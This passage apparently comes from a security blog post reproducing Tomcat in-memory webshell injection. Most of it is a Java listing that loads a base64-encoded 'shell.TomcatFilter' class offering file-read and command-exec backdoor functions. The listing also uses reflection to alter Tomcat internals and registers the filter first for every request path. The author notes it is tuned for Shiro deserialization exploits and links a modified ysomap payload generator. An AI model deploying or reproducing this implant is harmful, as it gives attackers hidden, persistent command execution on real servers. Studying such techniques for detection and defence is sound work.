+<p>![image-20201212152024680](../../../../../Library/Application Support/typora-user-images/image-20201212152024680.png)</p>
+<p>查看java8的文档可以发现，Class.forName(String name)其实是Class.forName(String name,true,currentLoader)的简写，如果直接使用雷神众测上的代码，有可能报class not found，我们需要手动指定classLoader或者直接使用方法调用类的ClassLoader，也就是xxxclass.class.getClassLoader()的结果。</p>
+</li>
+<li><p>第二个就是使用registerMapping注册一个Controller，这里首先需要获取当前的上下文，直接使用WebApplicationContextUtils.getWebApplicationContext方法获取即可。然后需要设置RequestMappingInfo，主要是设置可以访问控制器的方法和访问controller的路径，最后调用registerMapping方法即可。</p>
+</li>
+</ol>
+<h3 id="tomcat-filter内存shell复现"><a href="#tomcat-filter内存shell复现" class="headerlink" title="tomcat filter内存shell复现"></a>tomcat filter内存shell复现</h3><p>这种方法主要的思路就是通过反射修改WRAP_SAME_OBJECT，然后将lastServicedResponse和lastServicedRequest初始化，使得下一次请求能够获取request和response对象，然后就可以向上下文中注册了一个filter，并且把这个filter放到首位，使得filter一定能够被访问到。我把shell injection的内容一起放在了req和resp的初始化这里。</p>
+<p>分析的文章大家直接看原作者的吧，我觉得讲的还是很好的。</p>
+<p><a href="https://xz.aliyun.com/t/7388" target="_blank" rel="noopener">threedr3am</a></p>
+<p>有几个断点大家可以参考下，</p>
+<p>org.apache.catalina.core.ApplicationFilterChain的104和78行</p>
+<p>org.apache.catalina.core.ApplicationContext 的495行</p>
+<p>因为这里还考虑了shiro漏洞优化的问题，所以需要把这个注册的filter放到所有filter之前执行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(&#123;<span class="string">"/test"</span>&#125;)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Person <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//加载动态filter</span></span><br><span class="line"></span><br><span class="line">            String s1=<span class="string">"yv66vgAAADQAzQoALwBtCABMCwBuAG8LAHAAcQgAcggAcwoAFwB0CgAXAHUKAC4AdggAdwoALgB4CAB5CgB6AHsKAHoAfAoAegB9BwB+CgAQAH8HAIAKABIAbQcAgQcAggoAFwCDBwCECgCFAIYHAIcKAIgAiQoAFQCKCgAUAIsKABQAjAoAEgCNCACOCgASAI8KAJAAkQoAkACSCgCTAJQKAJMAlQgAlgoAFQCXCgCTAJgKABIAmQoALgCaCgCTAJsHAJwKACsAfwsAnQB9BwCeBwCfBwCgAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABRMc2hlbGwvVG9tY2F0RmlsdGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAKEBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAJwdwEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEABnJlc3VsdAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAANyZXEBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAANyZXMBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAANjbWQBAA1TdGFja01hcFRhYmxlBwCEBwCiBwB+AQAHZGVzdHJveQEABHJlYWQBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABGZpbGUBAA1zdHJpbmdCdWlsZGVyAQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABWxpbmUyBwCABwCBAQAEZXhlYwEABGxpbmUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAdjb21tYW5kAQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAhidWZmZXJJbgEAC2J1ZmZlckVycm9yBwCeBwCjBwCcBwCkAQALY2xvc2VTdHJlYW0BABYoTGphdmEvaW8vQ2xvc2VhYmxlOylWAQAGc3RyZWFtAQATTGphdmEvaW8vQ2xvc2VhYmxlOwEAClNvdXJjZUZpbGUBABFUb21jYXRGaWx0ZXIuamF2YQwAMQAyBwClDACmAFMHAKcMAKgAqQEAAAEABXJlYWQ6DACqAKsMAKwArQwAUgBTAQAFZXhlYzoMAFsAUwEAH2hlbHA6IHJlYWQ6W2ZpbGVdIHwgZXhlYzpbY21kXQoHAKIMAK4ArwwAsAAyDACxADIBABNqYXZhL2lvL0lPRXhjZXB0aW9uDACyADIBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDACzALQBABBqYXZhL2xhbmcvU3RyaW5nBwC1DAC2ALcBABhqYXZhL25pby9maWxlL09wZW5PcHRpb24HALgMALkAugwAMQC7DAAxALwMAL0AtAwAvgC/AQABCgwAwAC0BwDBDADCAMMMAFsAxAcAowwAxQDGDADHAMgBAAVVVEYtOAwAMQDJDADKAMgMAL4AywwAZwBoDABRADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwDMAQASc2hlbGwvVG9tY2F0RmlsdGVyAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9QcmludFdyaXRlcgEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9sYW5nL1Rocm93YWJsZQEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAKc3RhcnRzV2l0aAEAFShMamF2YS9sYW5nL1N0cmluZzspWgEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAVjbG9zZQEAD3ByaW50U3RhY2tUcmFjZQEABHRyaW0BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvbmlvL2ZpbGUvUGF0aHMBAANnZXQBADsoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uaW8vZmlsZS9QYXRoOwEAE2phdmEvbmlvL2ZpbGUvRmlsZXMBAA5uZXdJbnB1dFN0cmVhbQEARihMamF2YS9uaW8vZmlsZS9QYXRoO1tMamF2YS9uaW8vZmlsZS9PcGVuT3B0aW9uOylMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAB3dhaXRGb3IBAAMoKUkBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAqKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAOZ2V0RXJyb3JTdHJlYW0BABwoQylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQARamF2YS9pby9DbG9zZWFibGUAIQAuAC8AAQAwAAAABwABADEAMgABADMAAAAvAAEAAQAAAAUqtwABsQAAAAIANAAAAAYAAQAAAAgANQAAAAwAAQAAAAUANgA3AAAAAQA4ADkAAgAzAAAANQAAAAIAAAABsQAAAAIANAAAAAYAAQAAAAwANQAAABYAAgAAAAEANgA3AAAAAAABADoAOwABADwAAAAEAAEAPQABAD4APwACADMAAAFPAAIABwAAAHUrEgK5AAMCADoEGQTGAF4suQAEAQA6BRIFOgYZBBIGtgAHmQAWGQQItgAIOgQqGQS2AAk6BqcAJBkEEgq2AAeZABYZBAi2AAg6BCoZBLYACzoGpwAHEgw6BhkFGQa2AA0ZBbYADhkFtgAPpwAKOgUZBbYAEbEAAQAKAGoAbQAQAAMANAAAAEoAEgAAABEACgATAA8AFAAXABUAGwAWACUAFwAtABgAOAAZAEIAGgBKABsAVQAdAFkAHwBgACAAZQAhAGoAJgBtACQAbwAlAHQAJwA1AAAAUgAIABcAUwBAAEEABQAbAE8AQgBDAAYAbwAFAEQARQAFAAAAdQA2ADcAAAAAAHUARgBHAAEAAAB1AEgASQACAAAAdQBKAEsAAwAKAGsATABDAAQATQAAABgABv4AOAcATgcATwcAThwD+QAQQgcAUAYAPAAAAAYAAgAQAD0AAQBRADIAAQAzAAAAKwAAAAEAAAABsQAAAAIANAAAAAYAAQAAACwANQAAAAwAAQAAAAEANgA3AAAAAQBSAFMAAgAzAAAAyQAGAAUAAABKuwASWbcAE027ABRZuwAVWSu2ABYDvQAXuAAYA70AGbgAGrcAG7cAHE4BOgQttgAdWToExgASLBkEtgAeEh+2AB5Xp//qLLYAILAAAAADADQAAAAeAAcAAAAvAAgAMAARADEAKQAyACwAMwA2ADQARQA2ADUAAAA0AAUAAABKADYANwAAAAAASgBUAEMAAQAIAEIAVQBWAAIAKQAhAFIAVwADACwAHgBYAEMABABNAAAADwAC/gAsBwBZBwBaBwBOGAA8AAAABAABABAAAQBbAFMAAQAzAAACBwAGAAgAAADNuwASWbcAE00BTgE6BAE6BbgAISu2ACJOLbYAI1e7ABRZuwAVWS22ACQSJbcAJrcAHDoEuwAUWbsAFVkttgAnEiW3ACa3ABw6BQE6BhkEtgAdWToGxgASLBkGtgAeEAq2AChXp//pGQW2AB1ZOgbGABIsGQa2AB4QCrYAKFen/+kZBLgAKRkFuAApLcYAPS22ACqnADY6BhkGtgAsGQS4ACkZBbgAKS3GACEttgAqpwAaOgcZBLgAKRkFuAApLcYABy22ACoZB78stgAgsAAEABAAgACVACsAEACAALEAAACVAJwAsQAAALEAswCxAAAAAwA0AAAAdgAdAAAAOgAIADwACgA9AA0APgAQAEEAGABDAB0ARQAzAEYASQBIAEwASQBXAEoAZgBMAHEATQCAAFMAhQBUAIoAVgCOAFcAlQBQAJcAUQCcAFMAoQBUAKYAVgCqAFcAsQBTALgAVAC9AFYAwQBXAMUAWQDIAFsANQAAAFIACABMADQAXABDAAYAlwAFAEQAXQAGAAAAzQA2ADcAAAAAAM0AXgBDAAEACADFAEIAVgACAAoAwwBfAGAAAwANAMAAYQBXAAQAEAC9AGIAVwAFAE0AAAA0AAf/AEwABwcAYwcATgcAWQcAZAcAWgcAWgcATgAAGfoAGVQHAGVbBwBm/QATAAcAZvkAAgAKAGcAaAABADMAAABeAAEAAgAAAA8qxgANKrkALQEApwAETLEAAQAEAAoADQArAAMANAAAABYABQAAAF8ABABhAAoAZAANAGIADgBmADUAAAAMAAEAAAAPAGkAagAAAE0AAAAHAAJNBwBlAAABAGsAAAACAGw="</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] bytes1 = java.util.Base64.getDecoder().decode(s1.getBytes());</span><br><span class="line">            java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]&#123;String.class, byte[].class, int.class, int.class&#125;);</span><br><span class="line">            m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">//ClassLoader classLoader=ClassLoader.getSystemClassLoader();</span></span><br><span class="line">            <span class="comment">//ClassLoader classLoade1=Thread.currentThread().getContextClassLoader();</span></span><br><span class="line">            m.invoke(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> Object[]&#123;<span class="string">"shell.TomcatFilter"</span>, bytes1, <span class="number">0</span>, bytes1.length&#125;);</span><br><span class="line">            <span class="comment">/*刚开始反序列化后执行的逻辑*/</span></span><br><span class="line">            <span class="comment">//修改 WRAP_SAME_OBJECT 值为 true</span></span><br><span class="line">            Class c = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>);</span><br><span class="line">            java.lang.reflect.Field f = c.getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);</span><br><span class="line">            java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(<span class="string">"modifiers"</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            modifiersField.setInt(f, f.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (!f.getBoolean(<span class="keyword">null</span>)) &#123;</span><br><span class="line">                f.setBoolean(<span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//初始化 lastServicedRequest</span></span><br><span class="line">            c = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>);</span><br><span class="line">            f = c.getDeclaredField(<span class="string">"lastServicedRequest"</span>);</span><br><span class="line">            modifiersField = f.getClass().getDeclaredField(<span class="string">"modifiers"</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            modifiersField.setInt(f, f.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (f.get(<span class="keyword">null</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                f.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//初始化 lastServicedResponse</span></span><br><span class="line">            f = c.getDeclaredField(<span class="string">"lastServicedResponse"</span>);</span><br><span class="line">            modifiersField = f.getClass().getDeclaredField(<span class="string">"modifiers"</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            modifiersField.setInt(f, f.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (f.get(<span class="keyword">null</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                f.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Person o = <span class="keyword">new</span> Person();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(&#123;<span class="string">"/test1"</span>&#125;)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Person <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">/*shell注入，前提需要能拿到request、response等*/</span></span><br><span class="line">            java.lang.reflect.Field field = org.apache.catalina.core.ApplicationFilterChain<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                    .getDeclaredField("lastServicedRequest");</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ThreadLocal t = (ThreadLocal) field.get(<span class="keyword">null</span>);</span><br><span class="line">            ServletRequest servletRequest = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">//不为空则意味着第一次反序列化的准备工作已成功</span></span><br><span class="line">            <span class="keyword">if</span> (t != <span class="keyword">null</span> &amp;&amp; t.get() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                servletRequest = (ServletRequest) t.get();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servletRequest != <span class="keyword">null</span>) &#123;</span><br><span class="line">                javax.servlet.ServletContext servletContext = servletRequest.getServletContext();</span><br><span class="line">                org.apache.catalina.core.StandardContext standardContext = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">//判断是否已有该名字的filter，有则不再添加</span></span><br><span class="line">                <span class="keyword">if</span> (servletContext.getFilterRegistration(<span class="string">"star"</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">//遍历出标准上下文对象</span></span><br><span class="line">                    <span class="keyword">for</span> (; standardContext == <span class="keyword">null</span>; ) &#123;</span><br><span class="line">                        java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                        contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        Object o = contextField.get(servletContext);</span><br><span class="line">                        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> javax.servlet.ServletContext) &#123;</span><br><span class="line">                            servletContext = (javax.servlet.ServletContext) o;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o <span class="keyword">instanceof</span> org.apache.catalina.core.StandardContext) &#123;</span><br><span class="line">                            standardContext = (org.apache.catalina.core.StandardContext) o;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (standardContext != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="comment">//修改状态，要不然添加不了</span></span><br><span class="line">                        java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                                .getDeclaredField("state");</span><br><span class="line">                        stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                        <span class="comment">//创建一个自定义的Filter马</span></span><br><span class="line">                        <span class="comment">//从内存中加载马</span></span><br><span class="line">                        javax.servlet.Filter star = (javax.servlet.Filter)(Class.forName(<span class="string">"shell.TomcatFilter"</span>).newInstance());</span><br><span class="line">                        <span class="comment">//添加filter马</span></span><br><span class="line">                        javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext</span><br><span class="line">                                .addFilter(<span class="string">"star"</span>, star);</span><br><span class="line">                        filterRegistration.setInitParameter(<span class="string">"encoding"</span>, <span class="string">"utf-8"</span>);</span><br><span class="line">                        filterRegistration.setAsyncSupported(<span class="keyword">false</span>);</span><br><span class="line">                        filterRegistration</span><br><span class="line">                                .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="keyword">false</span>,</span><br><span class="line">                                        <span class="keyword">new</span> String[]&#123;<span class="string">"/*"</span>&#125;);</span><br><span class="line">                        <span class="comment">//状态恢复，要不然服务不可用</span></span><br><span class="line">                        <span class="keyword">if</span> (stateField != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (standardContext != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="comment">//生效filter</span></span><br><span class="line">                            java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                                    .getMethod("filterStart",null);</span><br><span class="line">                            filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                            filterStartMethod.invoke(standardContext, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">//把filter插到第一位</span></span><br><span class="line">                            org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext</span><br><span class="line">                                    .findFilterMaps();</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (filterMaps[i].getFilterName().equalsIgnoreCase(<span class="string">"star"</span>)) &#123;</span><br><span class="line">                                    org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];</span><br><span class="line">                                    filterMaps[i] = filterMaps[<span class="number">0</span>];</span><br><span class="line">                                    filterMaps[<span class="number">0</span>] = filterMap;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Person();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ysomap的改造"><a href="#ysomap的改造" class="headerlink" title="ysomap的改造"></a>ysomap的改造</h2><ol>
+<li>主要就是修改TemplatesImplBullet，使这边创建不同的继承abstractTranslet类，代码直接放在构造器里面就好了。这里改的时候有个坑，就是直接用StubTransletPayload中添加静态块的时候总是出现各种问题，最后就把request的部分放在单独的类的构造器里面。</li>
+<li>写了个TemplatesImplBulletTest测试，生成的.ser直接 cat xx.ser|处理|pbcopy到剪切板很方便。</li>
+</ol>
+<p>最后代码放在自己的仓库里面了 <a href="https://github.com/stArl23/ysomap" target="_blank" rel="noopener">https://github.com/stArl23/ysomap</a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li> <a href="https://mp.weixin.qq.com/s/5iYyRGnlOEEIJmW1DqAeXw" target="_blank" rel="noopener">Java代码执行漏洞中类动态加载的应用</a></li>
+<li><a href="https://mp.weixin.qq.com/s?src=11&timestamp=1607675714&ver=2759&signature=m1p776aRwHnY6xJAaYofks9dEKgXyNNgd7Ryrbo4yyBfYIXc2Tbpj0gjVah-kNmp4II2m8*17halUl6-ACKXH3Jo3-U7Dg80AXmgEDD1Mhd-b7If22EF7tQLSBsw55N5&new=1" target="_blank" rel="noopener">奇安信的java回显综述</a></li>
+<li><a href="https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g" target="_blank" rel="noopener">冰蝎内存shell，以后可以搞下</a></li>
+<li><a href="https://www.anquanke.com/post/id/198886#h3-8" target="_blank" rel="noopener">观星的通杀spring的思路</a></li>
+<li><a href="https://xz.aliyun.com/t/7388" target="_blank" rel="noopener">threedr3am的文章</a></li>
+<li><a href="https://mp.weixin.qq.com/s?src=11&timestamp=1607764581&ver=2762&signature=QAfgYO-UhlGfpPJ4fZkgSFK48uoWtR9Zzccnxq0tlhPpzsbe4dR1xlQexe3XHLOiAFjcVQJ0MCt30nRrLNhSYbxy4C3qWdMyk6Lq6Eztg7nxvpuV*fusGQBkhwfovSPr&new=1" target="_blank" rel="noopener">雷神众测的spring boot内存shell</a></li>
+<li><a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap原作者的文章</a></li>
+</ol>
+<h2 id="后续的计划"><a href="#后续的计划" class="headerlink" title="后续的计划"></a>后续的计划</h2><ol>
+<li>争取把哥斯拉和冰蝎的内存shell注册给写了</li>
+<li>继续复现漏洞</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/java/" rel="tag"># java</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/11/25/%E5%AE%89%E6%B4%B5%E6%9D%AFwebwp/" rel="next" title="安洵杯webwp">
+                <i class="fa fa-chevron-left"></i> 安洵杯webwp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">star</p>
+              <p class="site-description motion-element" itemprop="description">ctf wp and technologies about security</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
